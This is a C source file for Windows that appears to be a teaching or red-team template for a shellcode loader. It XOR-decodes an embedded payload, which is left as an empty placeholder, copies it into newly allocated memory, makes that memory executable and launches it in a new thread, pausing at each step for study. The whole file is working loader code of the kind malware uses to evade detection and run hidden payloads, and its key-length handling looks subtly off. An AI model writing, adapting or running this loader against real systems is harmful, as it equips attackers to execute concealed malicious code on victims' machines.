#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void pauseExecution(const char *note) {
    printf("%s\n", note);
    printf("hit enter to continue!\n");
    getchar();
}

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key[j];
        j++;
        if (j >= key_len) j = 0;  // Reset j after increment
    }
}

int main(void) {

	// need to add the XOR-encrypted payload here
	unsigned char encodedData[] = {};
	unsigned int dataSize = sizeof(encodedData);
	char key[] = "wereonaroadtonowherecomeoninside";
    
	// Allocate a buffer for payload
    void * allocatedMem = VirtualAlloc(0, dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // display addresses for learning purposes
    int pointerSizeHex = sizeof(void*) * 2;  // Calculate the width required for the pointer in hexadecimal
    printf("%-20s : 0x%0*p\n", "encoded data is stored at:", pointerSizeHex, (void *)encodedData);
    printf("%-20s : 0x%0*p\n", "memory allocated at:", pointerSizeHex, (void *)allocatedMem);

	pauseExecution("memory has been allocated.");

	// Decrypt the payload
	XOR((char *) encodedData, dataSize, key, sizeof(key));
	
	// Copy the payload to allocated buffer
	RtlMoveMemory(allocatedMem, encodedData, dataSize);

	pauseExecution("shellcode has been deXOR'ed + injected");
	
	DWORD prevProtection = 0;
    BOOL protectResult = VirtualProtect(allocatedMem, dataSize, PAGE_EXECUTE_READ, &prevProtection);

	
    pauseExecution("memory protection constant has been changed");

    if (protectResult == 0) {
        return GetLastError();
    } else {
        HANDLE threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) allocatedMem, 0, 0, 0);
        WaitForSingleObject(threadHandle, -1);
        return 0;
    }

}




